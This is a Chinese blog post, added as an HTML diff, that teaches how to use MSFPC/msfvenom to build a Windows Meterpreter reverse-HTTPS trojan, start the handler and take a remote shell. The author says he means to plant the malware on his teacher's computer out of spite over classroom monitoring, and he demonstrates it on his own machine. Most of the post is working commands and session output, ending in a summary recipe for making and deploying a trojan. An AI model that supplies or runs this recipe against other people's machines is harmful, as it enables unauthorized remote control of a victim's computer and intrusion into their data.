@@ -1,0 +1,455 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>【水】记一次有手就行的基于Metasploit的渗透 | GxxkSite</title>
+
+<link rel="shortcut icon" href="https://gxxk.site/favicon.ico?v=1706099014521">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gxxk.site/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            GxxkSite
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/friends/" class="menu gt-a-link">
+                            友链
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1706099014521" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    【水】记一次有手就行的基于Metasploit的渗透
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-12-03 ·
+                    </time>
+                    
+                        <a href="https://gxxk.site/wLXBpfHjS/" class="post-tags">
+                            # 渗透
+                        </a>
+                    
+                        <a href="https://gxxk.site/Z9xjw4i18m/" class="post-tags">
+                            # Metasploit
+                        </a>
+                    
+                        <a href="https://gxxk.site/JlVNz7IZxt/" class="post-tags">
+                            # Kali
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <blockquote>
+<p>本文仅介绍此渗透方法，仅供学习，不承担执行此教程带来的任何损失！</p>
+</blockquote>
+<h1 id="话题导入初识msfpc">话题导入/初识msfpc</h1>
+<p>今天因为<span class="heimu">被班任用监控制裁</span>这一事十分不服，被叫到办公室训话时发现老师还有一个在高处的监控<span class="heimu">（老师靠那个看见我搞小动作的）</span>，并且还是用网页访问，心生一计，给老师电脑下马（指在老师电脑上下载并执行我可控的恶意软件），于是回家就开始研究起来</p>
+<p>Kali Linux 启动！</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231203162246.png" alt="" loading="lazy"></figure>
+<p>打开Kali，我熟练的搜索“msf”，没想到还多了几个新朋友（也可能是我之前眼瞎没看见LOL）</p>
+<figure data-type="image" tabindex="2"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231203162400.png" alt="" loading="lazy"></figure>
+<p>“既然已有了<code>msfvenom</code>，怎么还多了个MSFPC？看缩写可能是 <code>payload creator</code>（机翻<span class="heimu">载荷创建器</span> 可以理解为攻击方和被控方的一个中间商/恶意软件（这种软件统称<code>payload</code>））”揣着疑问与好奇，我点开了MSFPC，果不其然，此工具全名<code>MSFvenom Payload Creator</code>，在当前<strong>Kali Linux 2023.3</strong>版本上1.4.5，就是msfvenom的更易用的版本，下方是帮助文档与机翻润色：</p>
+<pre><code class="language-text"> msfpc
+ [*] MSFvenom Payload Creator (MSFPC v1.4.5)
+
+ [i] Missing TYPE or BATCH/LOOP mode
+
+ /usr/bin/msfpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;)
+   Example: /usr/bin/msfpc windows 192.168.1.10        # Windows &amp; manual IP.
+            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP &amp; manual port.
+            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
+            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
+            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
+            /usr/bin/msfpc help verbose                # Help screen, with even more information.
+
+ &lt;TYPE&gt;:
+   + APK
+   + ASP
+   + ASPX
+   + Bash [.sh]
+   + Java [.jsp]
+   + Linux [.elf]
+   + OSX [.macho]
+   + Perl [.pl]
+   + PHP
+   + Powershell [.ps1]
+   + Python [.py]
+   + Tomcat [.war]
+   + Windows [.exe // .exe // .dll]
+
+ Rather than putting &lt;DOMAIN/IP&gt;, you can do a interface and MSFPC will detect that IP address.
+ Missing &lt;DOMAIN/IP&gt; will default to the IP menu.
+
+ Missing &lt;PORT&gt; will default to 443.
+
+ &lt;CMD&gt; is a standard/native command prompt/terminal to interactive with.
+ &lt;MSF&gt; is a custom cross platform shell, gaining the full power of Metasploit.
+ Missing &lt;CMD/MSF&gt; will default to &lt;MSF&gt; where possible.
+
+ &lt;BIND&gt; opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
+ &lt;REVERSE&gt; makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
+ Missing &lt;BIND/REVERSE&gt; will default to &lt;REVERSE&gt;.
+
+ &lt;STAGED&gt; splits the payload into parts, making it smaller but dependent on Metasploit.
+ &lt;STAGELESS&gt; is the complete standalone payload. More 'stable' than &lt;STAGED&gt;.
+ Missing &lt;STAGED/STAGELESS&gt; will default to &lt;STAGED&gt; where possible.
+
+ &lt;TCP&gt; is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
+ &lt;HTTP&gt; makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
+ &lt;HTTPS&gt; makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
+ &lt;FIND_PORT&gt; will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on &lt;TYPE&gt;.
+ Missing &lt;TCP/HTTP/HTTPS/FIND_PORT&gt; will default to &lt;TCP&gt;.
+
+ &lt;BATCH&gt; will generate as many combinations as possible: &lt;TYPE&gt;, &lt;CMD + MSF&gt;, &lt;BIND + REVERSE&gt;, &lt;STAGED + STAGELESS&gt; &amp; &lt;TCP + HTTP + HTTPS + FIND_PORT&gt; 
+ &lt;LOOP&gt; will just create one of each &lt;TYPE&gt;.
+
+ &lt;VERBOSE&gt; will display more information.
+
+----------我是一条分割线awa----------
+&amp; msfpc
+
+[*]MSFvenom payload创建器(MSFPC v1.4.5)。
+
+[i]缺少执行类型或 batch/loop 模式。
+
+/usr/bin/msfpc&lt;type&gt;(&lt;攻击方 域/IP&gt;)(&lt;端口&gt;)(&lt;cmd/msf&gt;)(&lt;正向/反向&gt;)(&lt;Stage/Stageless&gt;)(&lt;TCP/HTTP/HTTPS/Find_Port&gt;)(&lt;Batch/Loop&gt;)(&lt;Verbose&gt;)。
+示例：
+/usr/bin/msfpc windows 192.168.1.10     #创建Windows平台的
+/usr/bin/msfpc elf bind eth0 4444           # 创建Linux平台的会连接到攻击方eth0网卡IP的payload(正向链接)
+/usr/bin/msfpc stageless cmd py https#Python，Stageless命令提示符。
+/usr/bin/msfpc详细循环eth1#每种类型的有效负载，使用eth1的S IP。
+/usr/bin/msfpc msf Batch wan#所有可能的Meterpreter有效负载，使用广域网IP。
+/usr/bin/msfpc Help Verbose#Help屏幕，包含更多信息。
+
+&lt;type&gt;可用参数：
++APK
++ASP
++ASPX
++Bash[.sh]
++Java[.jsp]
++Linux[.self]
++OSX[.macho]
++Perl[.pl]
++PHP
++PowerShell[.ps1]
++PYTHON[.py]
++Tomcat[.war]
++Windows[.exe/.dll]
+
+缺失参数&lt;攻击方 域/IP&gt;，您可以执行一个接口，MSFPC将检测到该IP地址。
+缺失参数&lt;攻击方 域/IP&gt;将默认为IP菜单。 （这2句不会翻，总之创建的时候别漏写IP就行）
+
+缺失&lt;端口&gt;将默认端口为443。
+
+&lt;cmd&gt;是用于交互的标准/本机命令提示符/终端。
+&lt;msf&gt;是一个自定义的跨平台外壳，获得了Metasploit的全部功能。
+缺失参数&lt;CMD/MSF&gt;将在可能的情况下默认为&lt;MSF&gt;。
+
+&lt;正向&gt;在被攻击端打开一个端口，攻击者将连接到这些端口进行渗透。通常会被目标上的入口防火墙规则阻止。
+&lt;反向&gt;使被攻击段主动连接攻击者接受渗透。攻击者需要开放对应端口。使用目标上的入口防火墙规则阻止。
+缺失参数&lt;正向/反向&gt;将默认为&lt;反向&gt;。
+
+&lt;Stage&gt;将payload拆分成多个部分，使其更小，但依赖于Metasploit。
+&lt;Stageless&gt;是完整的独立payload。比&lt;Stage&gt;更‘稳定’。
+缺少&lt;Stage/Stageless&gt;将在可能的情况下默认为&lt;Stage&gt;。
+
+&lt;tcp&gt;是&lt;反向&gt;的标准方法。这是与类型最兼容的作为其原始的。可以很容易地在入侵检测系统上检测到。
+&lt;HTTP&gt;使通信看起来像是HTTP流量(未加密)。有助于数据包检测，这限制了对协议(如TCP80)的端口访问。
+&lt;HTTPS&gt;使通信看起来像是加密的HTTP通信。有助于数据包检测，这限制了对协议(例如，TCP443)的端口访问。
+&lt;Find_Port&gt;将尝试目标计算机上的每个端口，以找到出路。适用于Stick入口/入口防火墙规则。将根据&lt;type&gt;切换到‘allports’。
+缺少参数&lt;TCP/HTTP/HTTPS/Find_Port&gt;将默认为&lt;tcp&gt;。
+
+&lt;Batch&gt;将生成尽可能多的组合：&lt;type&gt;、&lt;CMD+MSF&gt;、&lt;BIND+REVERSE&gt;、&lt;Stage+Stage less&gt;&amp;&lt;TCP+HTTP+HTTPS+Find_Port&gt;。
+&lt;loop&gt;将只为每个&lt;type&gt;创建一个。
+
+&lt;Verbose&gt;将显示更多信息。
+</code></pre>
+<h1 id="小试牛刀-这不有手就行嘛">小试牛刀-这不有手就行嘛！</h1>
+<p>在简单看完之后，我打算对我的宿主机进行一次测试，先经过简单的虚拟机调整，再根据帮助文档，我写出了如下指令，便进行运行：</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
+ [*] MSFvenom Payload Creator (MSFPC v1.4.5)
+ [i]   IP: 192.168.179.131
+ [i] PORT: 443
+ [i] TYPE: windows (windows/meterpreter_reverse_https)
+ [i]  CMD: msfvenom -p windows/meterpreter_reverse_https -f exe \
+  --platform windows -a x86 -e generic/none LHOST=192.168.179.131 LPORT=443 \
+  &gt; '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe'
+
+ [i] windows meterpreter created: '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe'
+
+ [i] MSF handler file: '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
+ [i] Run: msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
+ [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
+ [*] Done!
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
+
+[*] Processing /home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc for ERB directives.
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https
+PAYLOAD =&gt; windows/meterpreter_reverse_https
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LHOST 192.168.179.131
+LHOST =&gt; 192.168.179.131
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LPORT 443
+LPORT =&gt; 443
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set ExitOnSession false
+ExitOnSession =&gt; false
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set EnableStageEncoding true
+[!] Unknown datastore option: EnableStageEncoding. Did you mean EnableUnicodeEncoding?
+EnableStageEncoding =&gt; true
+resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) &gt;  # 此时将恶意软件在目标机器上运行（建议管理员权限）
+[*] Started HTTPS reverse handler on https://192.168.179.131:443
+[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Redirecting stageless connection from /J83F7V1j2bOE1YXU4bkaoQ3Qy9QOYcXmelWRAuBwbPvjfixhNbBEUVtC-6y9sGtJgmTafB0yMsIodmHh7i6rPPDgwoDwfnt9NVrdKD-LBtlMQAn1sGJpBvA with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
+[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Attaching orphaned/stageless session...
+[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.179.131:443 -&gt; 192.168.179.1:6378) at 2023-12-03 10:27:49 -0500  # 此处代表连接成功，已打开会话
+
+msf6 exploit(multi/handler) &gt; sessions 1  # 根据上一条消息给出的sessionID切换到对应会话
+[*] Starting interaction with 1...
+
+meterpreter &gt;  # 此时就已经成功获取控制 使用“?”获取帮助
+meterpreter &gt; shell
+Process 14176 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.19044.3208]
+(c) Microsoft Corporation����������Ȩ����
+
+C:\Users\user\Downloads&gt;   # 拿到Shell 接下来任君发挥
+
+</code></pre>
+<h1 id="分析命令我是来看文的不是来看催眠书的">分析命令/我是来看文的，不是来看催眠书的</h1>
+<p>从此次操作中，我们共执行了以下命令：</p>
+<pre><code class="language-bash">msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
+msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
+# 进入msfconsole，连接上目标机器
+sessions 1
+shell
+</code></pre>
+<p>让我们来逐条分析：</p>
+<h2 id="生成木马">生成木马</h2>
+<pre><code class="language-bash">msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
+</code></pre>
+<p>这一条十分简单，在<a href="#%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80-%E8%BF%99%E4%B8%8D%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E5%98%9B">此段</a>中，我列出了帮助文档和有助于理解的机翻润色，对应过来即为：</p>
+<pre><code class="language-text">msfpc -&gt; 创建恶意软件的工具名称
+Windows -&gt; 恶意软件所作用的平台
+192.168.179.131 -&gt; 攻击方的IP地址
+MSF -&gt; 更全面的模式，可以使用更多功能，此参数的另外一个选项为 CMD ，仅能实现基本shell
+STAGELESS -&gt; 生成的恶意软件的部分恶意代码是存放于软件本体（STAGELESS选项，体积大但也大不到哪去，总之不超0.5mb）还是运行时攻击方通过网络传输恶意代码过来执行（STAGE选项，体积超小）
+HTTPS  -&gt; 连接方式 分很多种 具体的自己去看 HTTPS可以防止一些简单的防火墙识别出来是恶意软件
+</code></pre>
+<h2 id="进入监听模式">进入监听模式</h2>
+<pre><code class="language-bash">msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
+</code></pre>
+<p>这一条不用记，这段类似的代码将会出现于上一条代码执行完后，具体位置在下方标注出来了：</p>
+<pre><code class="language-text">┌──(kali㉿kali)-[~]
+└─$ msfpc Windows 省略...
+ [*] MSFvenom Payload Creator (MSFPC v1.4.5)
+ [i]   省略 省略 全部省略
+
+ [i] windows meterpreter created: '这里是生成的恶意软件的路径'
+
+ [i] MSF handler file: 省略
+ [i] Run: 运行这个位置的命令！
+ [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
+ [*] Done!
+</code></pre>
+<h2 id="接下来呢">接下来呢？</h2>
+<p>在进入监听模式后，需要用户触发恶意软件，触发后将会有一段文字代表某恶意软件开始连接到攻击方电脑，文字如下</p>
+<pre><code class="language-text">[*] Started 连接类型 reverse handler on 链接地址
+</code></pre>
+<p>当连接完成，可以开始工作时，会出来这么一个字样：</p>
+<pre><code class="language-text">[*] XXXX(省略) session 会话id opened (IP地址:攻击端口 -&gt; 另一个IP:另一个端口) 一大串时间
+</code></pre>
+<p>这个时候 对应到我们执行的命令里面，就是：</p>
+<pre><code class="language-text">sessions 会话ID  # 表示切换到xxx会话
+</code></pre>
+<p>当切换到对应会话ID时，咱就能搞事了，示范中，使用了<code>shell</code>命令作为演示，实际上还可以使用<code>help</code>或<code>?</code>命令列出可使用命令</p>
+<h1 id="总结">总结</h1>
+<p>运行环境：<strong>Kali Linux 2023.3 VMWare虚拟机</strong></p>
+<p>使用工具：<strong>Metasploit套件</strong>，其中包含msfvenom/msfconsole/msfpc等命令</p>
+<p>创建木马:</p>
+<pre><code class="language-bash">msfpc 攻击平台 攻击者IP 攻击端口 MSF(如果你是山顶洞人也可以CMD) 正/反向链接(bind/reverse) 存储模式(stage(less)) 连接模式(http(s),tcp)
+</code></pre>
+<p>等待木马上钩：<br>
+找到创建木马时给出的以<code>[*] Run:</code>开头的内容，复制那一行内除<code>[*] Run:</code>以外的命令<br>
+或<code>msfconsole -q -r '生成木马时额外给出的文件扩展名为.rc的文件的路径'</code></p>
+<p>上钩后 使用<code>sessions [sessionID]</code>切换会话，直接执行<code>sessions</code>查看所有可用会话</p>
+<p>使用<code>help</code>/<code>--help</code>/'?'在任何地方查看当前软件的帮助</p>
+<p>有更多的不理解的词汇可以在后面加上<strong>msf</strong>进行搜索 查找其意思并补充在评论区</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://gxxk.site/oLE3FCiOr/" class="post-title gt-a-link">
+                    [核桃编程-Python]课程模式下的代码会被修改吗？
+                </a>
+            </div>
+        
+
+        
+            <span id="/VJNwhqCfL//" class="leancloud_visitors" data-flag-title="【水】记一次有手就行的基于Metasploit的渗透">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'Cwz2dUkfTSvc1S9QRUsZ8MBY-MdYXbMMI',
+		appKey: 'Z0DQfPDQComYKCZZlqV0rWMH',
+		avatar: '',
+		pageSize: 5,
+		recordIp: true,
+		placeholder: '这nm是评论区，不是无人区啊喂！！！',
+		visitor: true,
+		serverURLs: 'https://valine.gxxk.site',
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a><br/>
+本站所有文章遵循CC-BY-SA 4.0国际许可协议<br/>
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span><br/>本站总访客数<span id="busuanzi_value_site_uv"></span>位<br/>本页总访问量<span id="busuanzi_value_page_pv"></span>次
+    </div>
+    <div>
+        Theme by <a href="https://imhanjie.com/" target="_blank">imhanjie</a>, Powered by <a
+                href="https://github.com/getgridea/gridea" target="_blank">Gridea | <a href="https://gxxk.site/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
